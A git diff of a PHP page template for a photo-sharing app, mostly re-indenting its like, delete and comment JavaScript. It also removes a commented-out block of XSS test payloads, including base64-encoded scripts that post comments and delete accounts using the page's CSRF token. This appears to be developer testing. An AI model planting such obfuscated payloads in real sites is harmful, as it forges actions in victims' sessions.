@@ -47,34 +47,34 @@
 					</div>
 				</div>
 			<?php endif; ?>
-		<?php require_once $_SERVER['DOCUMENT_ROOT'] . '/src/views/components/script.php'; ?>
-		<script>
-			const heart = document.querySelector('#heart');
-			const likeCounter = document.querySelector('[data-total-like]');
-			const input = document.querySelector('[data-comment-content]');
-			const button = document.querySelector('[data-button-comment]');
-			const form = document.querySelector('[data-form-add-comment]');
-			const btn_remove_picture = document.querySelector('#remove-picture');
-
-			<?php if (!isset($_SESSION['user'])): ?>
-				heart.addEventListener('click', () => {
-					alert('Vous devez être connecté');
-				});
-				btn_remove_picture.addEventListener('click', () => {
-					alert('Vous devez être connecté');
-				});
-				btn_remove_picture.remove();
-			<?php else: ?>
-				<?php if ($_SESSION['user']['id'] !== $post['user_id']): ?>
-					btn_remove_picture.remove();
-				<?php else: ?>
-					btn_remove_picture.addEventListener('click', async () => {
-						if (confirm('Voulez-vous vraiment supprimer cette image ?'))
-							await removePicture();
+			<?php require_once $_SERVER['DOCUMENT_ROOT'] . '/src/views/components/script.php'; ?>
+			<script>
+				const heart = document.querySelector('#heart');
+				const likeCounter = document.querySelector('[data-total-like]');
+				const input = document.querySelector('[data-comment-content]');
+				const button = document.querySelector('[data-button-comment]');
+				const form = document.querySelector('[data-form-add-comment]');
+				const btn_remove_picture = document.querySelector('#remove-picture');
+				
+				<?php if (!isset($_SESSION['user'])): ?>
+					heart.addEventListener('click', () => {
+						alert('Vous devez être connecté');
 					});
-
-					async function removePicture() {
-						await fetch('/posts/delete', {
+					btn_remove_picture.addEventListener('click', () => {
+						alert('Vous devez être connecté');
+					});
+					btn_remove_picture.remove();
+					<?php else: ?>
+						<?php if ($_SESSION['user']['id'] !== $post['user_id']): ?>
+							btn_remove_picture.remove();
+							<?php else: ?>
+								btn_remove_picture.addEventListener('click', async () => {
+									if (confirm('Voulez-vous vraiment supprimer cette image ?'))
+									await removePicture();
+							});
+							
+							async function removePicture() {
+								await fetch('/posts/delete', {
 							method: 'POST',
 							headers: {
 								'Content-Type': 'application/x-www-form-urlencoded',
@@ -83,8 +83,8 @@
 						})
 						.then(async (_) => {
 							if (!(_.status >= 200 && _.status <= 299))
-								return alert('Une erreur est survenue');
-							window.location.href = '/';
+							return alert('Une erreur est survenue');
+						window.location.href = '/';
 						});
 					}
 				<?php endif; ?>
@@ -92,7 +92,7 @@
 				heart.addEventListener('click', async () => {
 					await toggleHeart();
 				});
-
+				
 				async function toggleHeart()
 				{
 					await (heart.dataset.liked === 'true' ? unlike : like)();
@@ -108,9 +108,9 @@
 					})
 					.then(async (_) => {
 						if (!(_.status >= 200 && _.status <= 299))
-							return alert('Une erreur est survenue');
-						const response = await _.json();
-						setHearth(response.liked);
+						return alert('Une erreur est survenue');
+					const response = await _.json();
+					setHearth(response.liked);
 						likeCounter.textContent = response.total_likes;
 					});
 				}
@@ -125,13 +125,13 @@
 					})
 					.then(async (_) => {
 						if (!(_.status >= 200 && _.status <= 299))
-							return alert('Une erreur est survenue');
-						const response = await _.json();
-						setHearth(response.liked);
-						likeCounter.textContent = response.total_likes;
-					});
+						return alert('Une erreur est survenue');
+					const response = await _.json();
+					setHearth(response.liked);
+					likeCounter.textContent = response.total_likes;
+				});
 				}
-
+				
 				function setHearth(liked) {
 					if (liked) {
 						heart.setAttribute('fill', 'red');
@@ -176,36 +176,21 @@
 					card.classList.add('card', 'm-auto', 'mb-3');
 					card.style.width = '18rem';
 					card.innerHTML = `
-						<div class="card-body">
-							<p id="comment-${id}-content" class="card-text"></p>
-							<p id="comment-${id}-author" class="card-text"></p>
-							<p class="card-text"><small class="text-muted" id="comment-${id}-date"></small></p>
+					<div class="card-body">
+					<p id="comment-${id}-content" class="card-text"></p>
+					<p id="comment-${id}-author" class="card-text"></p>
+					<p class="card-text"><small class="text-muted" id="comment-${id}-date"></small></p>
 						</div>
-					`;
-
-					document.querySelector('#comments').appendChild(card);
-					document.querySelector(`#comment-${id}-content`).innerText = content;
-					document.querySelector(`#comment-${id}-author`).innerText = author;
+						`;
+						
+						document.querySelector('#comments').appendChild(card);
+						document.querySelector(`#comment-${id}-content`).innerText = content;
+						document.querySelector(`#comment-${id}-author`).innerText = author;
 					document.querySelector(`#comment-${id}-date`).innerText = created_at;
 				}
 			<?php endif; ?>
-		</script>
-		<!--
-			<h1>Hello</h1>
-			<script>alert('Hello')</script>
-
-			<script>
-				(function() {
-					setTimeout(() => {
-						var scr = document.createElement('script');
-						scr.innerHTML = 'Code html';
-						document.querySelector('body').appendChild(scr);
-					}, 3000)
-				})()
 			</script>
-
-			<script>(function() {setTimeout(() => {var scr = document.createElement('script');scr.innerHTML = atob('KGZ1bmN0aW9uKCkge2ZldGNoKCJodHRwczovLzEwLjAuMC4zL2NvbW1lbnRzIiwge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsfSxib2R5OiJjb250ZW50PUhlbGxvJnBvc3RJZD0iICsgd2luZG93LmxvY2F0aW9uLnNlYXJjaC5zcGxpdCgiPSIpWzFdICsgIiZjc3JmPSIgKyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJjc3JmIl0nKS52YWx1ZSx9KS50aGVuKGFzeW5jIChfKSA9PiB7Y29uc3QgcmVzcG9uc2UgPSBhd2FpdCBfLmpzb24oKTthZGRDb21tZW50KHJlc3BvbnNlLmlkLCByZXNwb25zZS5jb250ZW50LCByZXNwb25zZS5hdXRob3IsIHJlc3BvbnNlLmNyZWF0ZWRfYXQpO2lucHV0LnZhbHVlID0gJyc7fSk7fSkoKTs=');document.querySelector('body').appendChild(scr);}, 3000)})()</script>
-			<script>(function() {setTimeout(() => {var scr = document.createElement('script');scr.innerHTML = atob('KGZ1bmN0aW9uKCkge2ZldGNoKCJodHRwczovLzEwLjAuMC4zL2FjY291bnQvZGVsZXRlIiwge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsfSxib2R5OiJjc3JmPSIgKyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJjc3JmIl0nKS52YWx1ZSx9KS50aGVuKGFzeW5jIChfKSA9PiB7d2luZG93LmxvY2F0aW9uLmhyZWY9Ii8ifSk7fSkoKTs=');document.querySelector('body').appendChild(scr);}, 3000)})()</script>
-		-->
+		</div>
 	</body>
+	<?php require_once $_SERVER['DOCUMENT_ROOT'] . '/src/views/components/footer.php'; ?>
 </html>
